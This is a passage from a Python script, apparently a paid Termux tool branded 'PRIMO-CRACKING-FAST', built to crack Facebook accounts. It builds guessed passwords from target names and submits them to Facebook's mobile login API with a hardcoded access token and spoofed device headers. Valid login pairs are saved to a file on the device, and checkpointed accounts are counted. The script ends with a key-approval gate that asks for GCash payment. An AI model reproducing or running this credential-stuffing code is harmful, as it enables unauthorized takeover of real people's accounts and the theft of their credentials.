            sys.stdout.write('\r\r\033[1;36m [PRIMO-CRACKING-FAST] %s| \033[1;32mALIVE\033[0m║║\033[1;31mDEAD \033[1;32m%s\033[0m║║\033[1;31m%s'%(loop,len(oks),len(cps)));sys.stdout.flush()
            pas=pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            data={
              'adid': f'{uuid.uuid4()}', 
              'format': 'json', 
              'device_id': f'{uuid.uuid4()}', 
              'cpl': 'true', 
              'family_device_id': f'{uuid.uuid4()}', 
              'credentials_type': 'device_based_login_password', 
              'error_detail_type': 'button_with_disabled', 
              'source': 'device_based_login', 
              'email': ids, 
              'password': pas, 
              'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 
              'generate_session_cookies': '1', 
              'meta_inf_fbmeta': '', 
              'advertiser_id': f'{uuid.uuid4()}', 
              'currently_logged_in_userid': '0', 
              'locale': 'en_PH', 
              'client_country_code': 'PH', 
              'method': 'auth.login', 
              'fb_api_req_friendly_name': 'authenticate', 
              'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 
              'api_key': f'{str(uuid.uuid4()).replace("-","")}'
              
            }
            headers={
                    'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android '+str(random.randint(6,12))+'; 404: Not Found Build/QP1A.'+str(random.randint(100000,500000))+'.'+str(random.randint(100,600))+f') [FBAN/FB4A;FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)}'+';FBPN/com.facebook.orca;FBLC/en_US;FBBV/209190396;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-G960U;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=2076};FB_FW/1;]',
                    'Content-Type': 'application/x-www-form-urlencoded', 
                    'Host': 'graph.facebook.com', 
                    'X-FB-Net-HNI': str(random.randint(10000,99999)), 
                    'X-FB-SIM-HNI': str(random.randint(10000,99999)), 
                    'X-FB-Connection-Type': 'MOBILE.LTE', 
                    'X-Tigon-Is-Retry': 'False', 
                    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 
                    'x-fb-device-group': str(random.randint(1000,9999)), 
                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',  
                    'X-FB-Request-Analytics-Tags': 'graphservice', 
                    'X-FB-HTTP-Engine': 'Liger', 
                    'X-FB-Client-IP': 'True', 
                    'X-FB-Server-Cluster': 'True', 
                    'x-fb-connection-token': str(uuid.uuid4()).replace('-','')  
              
            }
            url='https://graph.facebook.com/auth/login'
            req=requests.post(url,data=data,headers=headers).json()
            if 'session_key' in req:
                print('\r\r\033[1;32m[ALIVE] '+ids+'|'+pas+'\n')
                open('/sdcard/PRIMO-ALIVE.txt','a').write(ids+' ^ '+pas+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in req['error']['message']:
                print('\r\r\033[1;31m[CHECKPOINT] '+ids+'|'+pas)
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass
def sub():
  key1=open('/data/data/com.termux/files/usr/bin/.mrBALOCH -cov', 'r').read()
  clear()
  print(logo)
  if key1 in r1:
    os.system('clear')
    menu()
  else:
    os.system("clear")
    print("\t \033[1;32m First Get Approval\033[1;37m ")
    time.sleep(5)
    os.system("clear")
    print(logo)
    print ("")
    print("YOU HAVE TO GET APPROVE FIRST BEFORE USING IT")
    print ("")
    print(" Your Key is Not Approved ")
    print("")
    print("MODE OF PAYMENT: GCASH")
    print ("")
    print (" Your Key : "+ak+ah+key1 )
    print ("")
    name = input(" Your Name : ")
    input(" Press Enter To Send Key")
    time.sleep(3.5)
menu()